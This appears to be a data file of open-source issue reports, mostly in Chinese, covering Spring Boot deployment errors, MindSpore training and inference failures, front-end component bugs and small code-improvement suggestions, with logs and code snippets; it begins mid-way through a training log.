0.7086508870124817 epoch: 20 step: 385, loss is 0.6819330453872681 epoch: 20 step: 386, loss is 0.6998844742774963 epoch: 20 step: 387, loss is 0.6889538764953613 epoch: 20 step: 388, loss is 0.6825343370437622 epoch: 20 step: 389, loss is 0.6981315612792969 epoch: 20 step: 390, loss is 0.7189347743988037"
forest 支持springboot 1.5.14.realese 启动失败,"Forest: version Backend: (okhttp或httpclient)/version 该问题是如何引起的？ ""屏幕截图.png"") 报错信息/完整请求日志（如果没有请求日志请把开关打开） org.springframework.context.ApplicationContextException: Unable to start embedded container; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration$EmbeddedTomcat': Initialization of bean failed; nested exception is java.lang.AbstractMethodError 接口定义（必要时请提供）   <code>: 升级1.5.24版本启动报错 (https://images.gitee.com/uploads/images/2022/0704/145434_a5fac5dd_430856.png"
pig4cloud / pig技术指南v3 / 浏览器实时查看服务日志 配置报404错误,"pig-monitor开启日志文件，提示配置 logfile springboot提示 Deprecated configuration property 'logging.file' 即此key已经废弃 建议更新技术文档,顺便看下以下配是否正确，监控访问日志文件报404。。   <code>: # 配置Logfile Viewer logging: file: logs/${spring.application.name}/debug.log # 配置Logfile Viewer logging: file: name: debug.log path: logs/${spring.application.name}/"
预测时 ZeroCopyRun 出core，看不到报错信息,"如题，预测时，调用ZeroCopyRun 出core，看不到内部报错信息。 有什么办法可以看到报错信息   <code>: auto predictor =paddle::CreatePaddlePredictor&lt;paddle::contrib::AnalysisConfig, paddle::PaddleEngineKind::kAnalysis&gt;(config); ... predictor-&gt;ZeroCopyRun();"
Rename `AddOp` to `AppendOp` in `NetOp`,"Even is shorter than , is better than in several points: hint the is a sequence of operators and just add that operator at the end of . is a more C++ style name but seems simpler. is easy to confusing with , which means add two or more tensor with the same shape together. If that name should be changed, I will give a PR next day as my fix-it day PR :-)   <code>: Add Append Append Add Append NetOp append NetOp PushBack Append Net.AddOp element-wise add operator"
【SSL证书配置】绝对路径、相对路径、http路径,前言 首先感谢作者的开源项目，为我的团队带来了极大的便利。 配置ssl退款证书时，只支持绝对路径方式，无可移植性。导致环境移植部署失败。 目前项目采用springboot开发，部署使用docker镜像。使用绝对路径读取静态资源时，带来了一些困扰。期望能够优化他。 如下图文档描述：   <code>: package com.egzosn.pay.common.http; public class HttpRequestTemplate { ｝
option 渲染问题,"layui 2.6.5 div 使用layui-bg-* 后，option 字体变白 html代码如下   <code>: &lt;div class=""layui-container layui-bg-cyan""&gt; &lt;div class=""layui-row""&gt; &lt;div class=""layui-col-md7"" style=""padding-top: 20px;""&gt; &lt;a href=""/"" style=""color: #1E9FFF;"" &gt;&lt;h2&gt;SUNNET-DN42&lt;i class=""layui-icon layui-icon-home""&gt;&lt;/i&gt;&lt;/h2&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class=""layui-col-md5"" style=""padding-top: 10px;""&gt; &lt;form class=""layui-form"" action=""/redir"" method=""GET""&gt; &lt;div class=""layui-form-item""&gt; &lt;div class=""layui-input-inline""&gt; &lt;select name=""action""&gt; &lt;option value=""detail""&gt;show protocols all&lt;/option&gt; &lt;option value=""generic""&gt;show ...&lt;/option&gt; &lt;option value=""route""&gt;show route for ...&lt;/option&gt; &lt;option value=""route_all""&gt;show route for ... all&lt;/option&gt; &lt;option value=""route_bgpmap""&gt;show route for ... (bgpmap)&lt;/option&gt; &lt;option value=""route_generic""&gt;show route ...&lt;/option&gt; &lt;option value=""route_where""&gt;show route where net ~ [ ... ]&lt;/option&gt; &lt;option value=""route_where_all""&gt;show route where net ~ [ ... ] all&lt;/option&gt; &lt;option value=""route_where_bgpmap""&gt;show route where net ~ [ ... ] (bgpmap)&lt;/option&gt; &lt;option value=""summary"" selected&gt;show protocols&lt;/option&gt; &lt;option value=""traceroute""&gt;traceroute ...&lt;/option&gt; &lt;option value=""whois""&gt;whois ...&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;input name=""server"" type=""hidden"" value=""lax1-us+sjc1-us+nyc1-us+lon1-uk+par1-fr+ams1-nl+fra1-de+mos1-ru+sin1-sg+hk1-hk+tp1-tw+tyo1-jp+syd1-au""&gt; &lt;div class=""layui-input-inline""&gt; &lt;input type=""text"" name=""target"" placeholder=""Target"" class=""layui-input"" value=""""&gt; &lt;/div&gt; &lt;button class=""layui-btn"" type=""submit""&gt;&amp;raquo;&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;"
"多租户如何实现tenant_id in (1, 2)","当前使用版本 3.1.2   <code>: tenantSqlParser.setTenantHandler(new TenantHandler() { @Override public Expression getTenantId() { ValueListExpression list = new ValueListExpression(); // 从当前系统上下文中取出当前请求用户的关联项目Id，通过解析器注入到SQL中。 String currentTenantId = apiContext.getCurrentTenantId(); if (currentTenantId.isEmpty()) { currentTenantId=userService.getById(AbstractApiUtils.currentUid()).getUProjectId(); } List&lt;Expression&gt; expressionList=new ArrayList&lt;&gt;(); Arrays.stream(currentTenantId.split("","")).forEach(s -&gt; { Expression e=new LongValue(s); expressionList.add(e); }); list.setExpressionList(new ExpressionList(expressionList)); return list; }"
请教大佬,"我如何部署到tomcat上？我自己尝试打成war包，但项目启动报错   <code>: . ____ _ __ _ _ /\\ / ___'_ __ _ _(_)_ __ __ _ \ \ \ \ ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \ \\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v2.0.2.RELEASE) 2020-11-05 16:48:56.398 INFO 17095 --- [com-startStop-1] kohgylw.kiftd.mc.MCServletInitializer : Starting MCServletInitializer v1.0.35-RELEASE on localhost.localdomain with PID 17095 (/www/wwwroot/kiftd.jw.com/WEB-INF/classes started by www in /) 2020-11-05 16:48:56.411 INFO 17095 --- [com-startStop-1] kohgylw.kiftd.mc.MCServletInitializer : No active profile set, falling back to default profiles: default 2020-11-05 16:48:56.527 INFO 17095 --- [com-startStop-1] ConfigServletWebServerApplicationContext : Refreshing org.springframework.boot.web.servlet.context.AnnotationConfigServletWebServerApplicationContext@69fc9339: startup date [Thu Nov 05 16:48:56 CST 2020]; root of context hierarchy 05-Nov-2020 16:48:57.033 信息 [kiftd.jw.com-startStop-1] org.apache.catalina.core.ApplicationContext.log Initializing Spring embedded WebApplicationContext 2020-11-05 16:48:57.034 INFO 17095 --- [com-startStop-1] o.a.c.c.C.[Catalina].[kiftd.jw.com].[/] : Initializing Spring embedded WebApplicationContext 2020-11-05 16:48:57.034 INFO 17095 --- [com-startStop-1] o.s.web.context.ContextLoader : Root WebApplicationContext: initialization completed in 507 ms 2020-11-05 16:48:57.173 INFO 17095 --- [com-startStop-1] o.s.b.w.servlet.FilterRegistrationBean : Mapping filter: 'errorPageFilter' to: [/*] 2020-11-05 16:48:57.287 INFO 17095 --- [com-startStop-1] kohgylw.kiftd.mc.MCServletInitializer : Started MCServletInitializer in 2.108 seconds (JVM running for 10.174) 05-Nov-2020 16:48:57.450 严重 [kiftd.jw.com-startStop-1] org.apache.catalina.core.StandardContext.listenerStart 异常将上下文初始化事件发送到类的侦听器实例.[kohgylw.kiftd.server.listener.ServerInitListener] java.lang.NullPointerException at kohgylw.kiftd.server.util.FileNodeUtil.initNodeTableToDataBase(FileNodeUtil.java:49) at kohgylw.kiftd.server.listener.ServerInitListener.contextInitialized(ServerInitListener.java:57) at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4701) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5167) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1412) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1402) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 2020-11-05 16:48:57.461 ERROR 17095 --- [com-startStop-1] o.a.c.c.C.[Catalina].[kiftd.jw.com].[/] : 异常将上下文初始化事件发送到类的侦听器实例.[kohgylw.kiftd.server.listener.ServerInitListener] java.lang.NullPointerException: null at kohgylw.kiftd.server.util.FileNodeUtil.initNodeTableToDataBase(FileNodeUtil.java:49) ~[classes/:1.0.35-RELEASE] at kohgylw.kiftd.server.listener.ServerInitListener.contextInitialized(ServerInitListener.java:57) ~[classes/:1.0.35-RELEASE] at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4701) [catalina.jar:8.5.54] at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5167) [catalina.jar:8.5.54] at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) [catalina.jar:8.5.54] at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1412) [catalina.jar:8.5.54] at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1402) [catalina.jar:8.5.54] at java.util.concurrent.FutureTask.run(FutureTask.java:266) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) [na:1.8.0_121] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) [na:1.8.0_121] at java.lang.Thread.run(Thread.java:745) [na:1.8.0_121]"
[ST][MS][modelzoo][deeplabv3_plus][gpu] deeplabv3_plus在gpu环境训练失败,"retinaface_resnet50在gpu环境训练失败 / 硬件环境: /device GPU : -- MindSpore version :master commit_id:cde09ee9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_deeplabv3plus_s8_gpu_check_loss_8p_0004.py pytest -s test_ms_deeplabv3plus_s8_gpu_check_loss_8p_0004.py 训练推理成功 转给张勇   <code>: [ERROR] DEVICE(64483,7f4e4c020700,python):2022-10-25-16:08:01.615.611 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:182] SyncStream] cudaStreamSynchronize failed, ret[700], an illegal memory access was encountered [ERROR] DEBUG(64483,7f4f67d0b740,python):2022-10-25-16:08:29.471.996 [mindspore/ccsrc/debug/rdr/graph_recorder.cc:41] DumpIRProto] Open file '/home/jenkins0/solution_test/cases/02network/00cv/deeplabv3_plus/train/test_ms_deeplabv3plus_s8_gpu_check_loss_8p_0004/scripts/s8_r2_train/rank_4/rdr/SESSION.graph_build.0.20221025160739.pb' failed! [ERROR] DEBUG(64483,7f4f67d0b740,python):2022-10-25-16:08:54.979.713 [mindspore/ccsrc/debug/rdr/graph_recorder.cc:41] DumpIRProto] Open file '/home/jenkins0/solution_test/cases/02network/00cv/deeplabv3_plus/train/test_ms_deeplabv3plus_s8_gpu_check_loss_8p_0004/scripts/s8_r2_train/rank_4/rdr/SESSION.graph_build.1.20221025160749.pb' failed! [CRITICAL] RUNTIME_FRAMEWORK(64483,7f4f67d0b740,python):2022-10-25-16:08:59.421.366 [mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:633] Run] Sync stream failed:GPU_4 [WARNING] MD(64483,7f4f67d0b740,python):2022-10-25-16:08:59.433.275 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 10; batch_queue: 15, 16, 15, 16, 15, 16, 15, 16, 15, 16; push_start_time: 2022-10-25-16:07:41.420.035, 2022-10-25-16:07:42.051.926, 2022-10-25-16:07:42.438.829, 2022-10-25-16:07:49.754.083, 2022-10-25-16:07:53.133.309, 2022-10-25-16:07:54.556.567, 2022-10-25-16:07:55.956.933, 2022-10-25-16:07:57.356.827, 2022-10-25-16:07:58.757.748, 2022-10-25-16:08:00.156.269; push_end_time: 2022-10-25-16:07:41.420.671, 2022-10-25-16:07:42.065.138, 2022-10-25-16:07:49.754.025, 2022-10-25-16:07:53.133.281, 2022-10-25-16:07:54.556.547, 2022-10-25-16:07:55.956.904, 2022-10-25-16:07:57.356.806, 2022-10-25-16:07:58.757.720, 2022-10-25-16:08:00.156.248, 2022-10-25-16:08:59.426.151. [CRITICAL] DEVICE(64483,7f4f67d0b740,python):2022-10-25-16:08:59.433.380 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:76] FreeHostPinnedMem] cudaFreeHost failed, ret[700], an illegal memory access was encountered terminate called after throwing an instance of 'std::runtime_error' what(): cudaFreeHost failed, ret[700], an illegal memory access was encountered"
avue - Default其他组件 - Chat 客服聊天 : 第一行  avue-chat标签 有2处错误,"avue - Default其他组件 - Chat 客服聊天 : 第一行 avue-chat标签 有2处错误 1. 2.   <code>: ref=""chat"" 写了两遍 导致 页面报错 &lt;/avue-chat&gt;写了两遍 导致 页面报错"
演示文档 tables/edit 设置编辑模式的 EditForm 模式示例点击编辑报错 . ,"https://www.blazor.zone/tables/edit 中的[设置编辑模式] [EditForm 模式示例] 点击某行编辑报错: 报错源码 src\BootstrapBlazor\Components\EditorForm\EditorForm.razor.cs line 143 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;Table TItem=""Foo"" IsPagination=""true"" PageItemsSource=""@PageItemsSource"" IsStriped=""true"" IsBordered=""true"" IsMultipleSelect=""true"" IsTracking=""true"" ShowToolbar=""true"" ShowExtendButtons=""true"" ShowSkeleton=""true"" AddModalTitle=""增加测试数据窗口"" EditModalTitle=""编辑测试数据窗口"" OnQueryAsync=""@OnQueryAsync"" EditMode=""EditMode.EditForm"" System.InvalidOperationException:“验证表单与 EditorForm 绑定模型不一致” /// &lt;summary&gt; /// OnInitialized 方法 /// &lt;/summary&gt; protected override void OnInitialized() { base.OnInitialized(); if (CascadedEditContext != null) { var message = Localizer[""ModelInvalidOperationExceptionMessage"", nameof(EditorForm&lt;TModel&gt;)]; if (!CascadedEditContext.Model.GetType().IsAssignableTo(typeof(TModel))) { throw new InvalidOperationException(message); } Model = (TModel)CascadedEditContext.Model; } if (Model == null) { throw new ArgumentNullException(nameof(Model)); } PlaceHolderText ??= Localizer[nameof(PlaceHolderText)]; }"
代码生成模块_含有前缀的表名生成实体对象名优化,"pigx版本: 2.5.1 操作系统:windows 是否修改包名: 否   <code>: /** * 表名转换成Java类名 */ private String tableToJava(String tableName, String tablePrefix) { if (StringUtils.isNotBlank(tablePrefix)) { tableName = tableName.replace(tablePrefix, """"); } return columnToJava(tableName); } replace会将所有包含前缀的字符替换，可改为replaceFirst 例如：t_amount_detail"
[MS][LITE][ 推理]ml_facelandmark.pb模型在手机cpu上推理，余弦相似度精度误差不符合预期,"ml_facelandmark.pb模型在手机cpu上推理，余弦相似度精度误差不符合预期 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行转换命令 ./converter_lite --fmk=TF --modelFile=ml_facelandmark.pb --outputFile=ml_facelandmark_fullquant --inputShape=input_image:1,112,112,3 --configFile=fullquant.config 手机（序列号3758514554583398）上执行推理 推理精度符合预期   <code>: [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1124][DEBUG]Load model from ./data/model/ml_facelandmark_fullquant.ms [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1188][DEBUG][InputTensorInfo]TENSOR_NAME=input_image;SHAPE=1,112,112,3,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1216][DEBUG]Load data from ./data/ml_facelandmark_0.bin to input_image [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1256][DEBUG][OutputTensorInfo]TENSOR_NAME=landmark_squeeze;SHAPE=1,136,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1256][DEBUG][OutputTensorInfo]TENSOR_NAME=headpose_squeeze;SHAPE=1,3,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1256][DEBUG][OutputTensorInfo]TENSOR_NAME=left_eye_occlusion_classification_squeeze;SHAPE=1,1,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1256][DEBUG][OutputTensorInfo]TENSOR_NAME=right_eye_occlusion_classification_squeeze;SHAPE=1,1,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1256][DEBUG][OutputTensorInfo]TENSOR_NAME=mouth_occlusion_classification_squeeze;SHAPE=1,1,;TYPE=43 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1926][DEBUG]Check eval result. [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1577][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1486][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1616][Check][Result][Pass][landmark_squeeze]accepted=0.990000,actual=0.999912 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1577][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1486][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1618][Check][Result][Failed][headpose_squeeze]accepted=0.960000,actual=0.883044 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1577][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1486][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1616][Check][Result][Pass][left_eye_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1577][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1486][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1616][Check][Result][Pass][right_eye_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1577][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1486][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1616][Check][Result][Pass][mouth_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][12:00:21 2022/09/27][new_net_test_mslite.cpp:1700][FAILED]MsLiteTestResultAccuracyLossRateCheckFail:-7 Assertion Failed Testcase Name: GE_NET_LITE_new_net_fullquant"
2.3版本中的DividePlugin有bug,"@jav public class DividePlugin extends AbstractSoulPlugin { 2.3版本里面，这一行代码是有bug的，rule.getHandle()是个json数组，不是json对象Gson解析时，有bug的   <code>: @Override protected Mono&lt;Void&gt; doExecute(final ServerWebExchange exchange, final SoulPluginChain chain, final SelectorData selector, final RuleData rule) { final SoulContext soulContext = exchange.getAttribute(Constants.CONTEXT); assert soulContext != null; final DivideRuleHandle ruleHandle = GsonUtils.getInstance().fromJson(rule.getHandle(), DivideRuleHandle.class);"
由于crud组件appendToBody固定为true，在qiankun微前端子应用开启样式隔离后导致弹窗内样式无法被应用,错误描述： 项目使用qiankun的微前端方案，并且子应用开启了样式隔离，所以弹窗必须安装在子应用的dom下，不能安装在body下，否则样式无法生效！ 但是看了代码发现crud的dialog默认加了直接安装在了body下，想问下这个属性可否做成支持全局配置的形式，方便一些特殊情况的处理！ 版本号： 2.8.25 异常截图和代码   <code>: append-to-body
关于IdcardUtil建议,JDK版本： openjdk_8_201 hutool版本： 5.3.9 !public static boolean isValidCard(String idCard) { idCard = idCard.trim(); int length = idCard.length(); }   <code>: 验证的时候将传过来的身份证信息进行了去空格的操作，就算这个字符串带的有空格也保证验证通过了 在getProvinceByIdCard这个省份分析的这个方法里面却没有添加去空格的操作，就会导致之前检验的合法 的身份证信息，因为带空格导致这个分析不出来身份得到一个null 。
[CT][MS][Cholesky]err msg need update,"校验信息有待优化 / 硬件环境: /device ascend/CPU/ : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 输入不是方阵时， 给出清晰明确的报错信息 报错信息里shape 5x2 写成了5 ？2   <code>: def test_cholesky_with_input_x_not_batch_square(): input_x = Tensor(np.random.uniform(1, 3, size=[5, 2]).astype(np.float32)) fact = CholeskyMock(attributes={'upper': False}, inputs=[input_x]) # with pytest.raises(ValueError) as err: &gt; fact.forward_mindspore_impl() E ValueError: For Cholesky, input x must be batch squares, but got batch 5 ? 2 matrices. def test_cholesky_with_input_x_not_batch_square(): input_x = Tensor(np.random.uniform(1, 3, size=[5, 2]).astype(np.float32)) fact = CholeskyMock(attributes={'upper': False}, inputs=[input_x]) # with pytest.raises(ValueError) as err: &gt; fact.forward_mindspore_impl() E ValueError: For Cholesky, input x must be batch squares, but got batch 5 ? 2 matrices."
新增的定时任务为啥设置为暂停状态,"如果我放开这个限制，会有什么影响吗   <code>: /** * 新增任务 * * @param job 调度信息 调度信息 */ @Override @Transactional(rollbackFor = Exception.class) public int insertJob(SysJob job) throws SchedulerException, TaskException { job.setStatus(ScheduleConstants.Status.PAUSE.getValue());//注释此处 int rows = jobMapper.insertJob(job); if (rows &gt; 0) { ScheduleUtils.createScheduleJob(scheduler, job); } return rows; }"
Remove `numel` field in tensor ,"It is duplicated with . We can use to calculate everytime. It does not cost too much. is not initialized by the constructor. Also, is hard to synchronize with . So just remove it.   <code>: dim_ dim_ numel numel numel dim_"
[ST][MS][OPS]pad接口反向计算graph模式报错,"pad接口反向graph模式报错，pynative可以跑通 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :commit_id = '[sha1]:8ce30f7d,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_ops_pad_fun.py cd solution_test/cases/04operator/01array/pad export TRAIN_MODE=GRAPH_MODE pytest -s test_ms_ops_pad_func.py 用例全部通过 E TypeError: For primitive[PadV3], the paddings value must be one of ['int', 'tuple', 'list'] with all Int elements, but got AnyValue E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/jenkins0/solution_test/cases/04operator/01array/pad/rank_0/om/analyze_fail.dat' for more details. Get instructions about at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/jenkins0/solution_test/common/utils/operator_helper.py:49 E return self.grad(self.network)(*inputs) E ^ E # 1 In file /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/ops/_grad_experimental/grad_nn_ops.py:149 E if mode == 'constant': E # 2 In file /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/ops/_grad_experimental/grad_nn_ops.py:151 E dx = pad_v3_grad(dout, neg_paddings, zeros_like(constant_values)) E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/utils/check_convert_utils.cc:856 CheckIntOrTupleInt /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/common/api.py:1320: TypeError 走给杨硕   <code>: analyze_fail.dat"
无法使用NNIE进行转换caffemodel,"【Document Link】/【文档链接】 参考文档https://www.mindspore.cn/lite/docs/zh-CN/r1.9/use/nnie.html,由caffemodel转换失败 执行的命令为： <ol start=""3""> 【Existing Issues】/【存在的问题】 总体log如下 <ol start=""4""> 【Expected Result】【预期结果】 Please fill in the expected result   <code>: ./converter_lite --fmk=CAFFE --modelFile=${model_name}.prototxt --weightFile=${model_name}.caffemodel --configFile=./converter.cfg --outputFile=yolov5s [ERROR] LITE(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.228.831 [mindspore/lite/tools/converter/converter_context.cc:49] GetConfigInfo] This section [const vector][n, n, i, e] config info is not existed. [WARNING] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.228.898 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:189] InitNnieConfigInfo] no nnie_config_path in [nnie]section, will run nnie_config_path: ""./nnie.cfg"" [WARNING] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.228.910 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:202] InitNnieConfigInfo] there is no nnie_disable_inplace_fusion in [nnie] config section. prepare to generate custom layer output data. [ERROR] LITE(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.235.725 [mindspore/lite/tools/converter/converter_context.cc:49] GetConfigInfo] This section [const vector][n, n, i, e] config info is not existed. [WARNING] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.235.762 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:286] InputsDataGenerate] no nnie_data_process_path in [nnie] section., will use default. [ERROR] /home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/common/nnie_dynamic_library_loader.cc|60|Open: ""open so failed:"" + std::string(dlerror()) [ERROR] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.236.693 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:304] InputsDataGenerate] open dynamic library failed. /opt/mindspore-lite-1.9.0-linux-x64/tools/converter/converter/../providers/Hi3516D/libmslite_nnie_data_process.so [ERROR] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.236.748 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:363] ProcessInputsData] WKConfig Parser Inputs Data Fail. [ERROR] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.236.791 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:652] GenerateCustomLayerOutputData] Generate input data failed from image list. [ERROR] API(51,7fd170c5ef40,converter_lite):2022-11-09-11:03:47.236.839 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86root@ba2de20098f9:/opt/mindspore-lite-1.9.0-linux-x64/tools/converter/converter# ./converter_lite --fmk=CAFFE --modelFile=${model_name}.prototxt --weightFile=${model_name}.caffemodel --configFile=./converter.cfg --outputFile=yolov5s-silu-test [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.893.464 [mindspore/lite/tools/converter/converter_context.cc:49] GetConfigInfo] This section [const vector][n, n, i, e] config info is not existed. [WARNING] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.893.534 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:189] InitNnieConfigInfo] no nnie_config_path in [nnie]section, will run nnie_config_path: ""./nnie.cfg"" [WARNING] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.893.547 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:202] InitNnieConfigInfo] there is no nnie_disable_inplace_fusion in [nnie] config section. prepare to generate custom layer output data. [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.899.801 [mindspore/lite/tools/converter/converter_context.cc:49] GetConfigInfo] This section [const vector][n, n, i, e] config info is not existed. [WARNING] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.899.838 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:286] InputsDataGenerate] no nnie_data_process_path in [nnie] section., will use default. [ERROR] /home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/common/nnie_dynamic_library_loader.cc|60|Open: ""open so failed:"" + std::string(dlerror()) [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.651 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:304] InputsDataGenerate] open dynamic library failed. /opt/mindspore-lite-1.9.0-linux-x64/tools/converter/converter/../providers/Hi3516D/libmslite_nnie_data_process.so [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.682 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:363] ProcessInputsData] WKConfig Parser Inputs Data Fail. [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.785 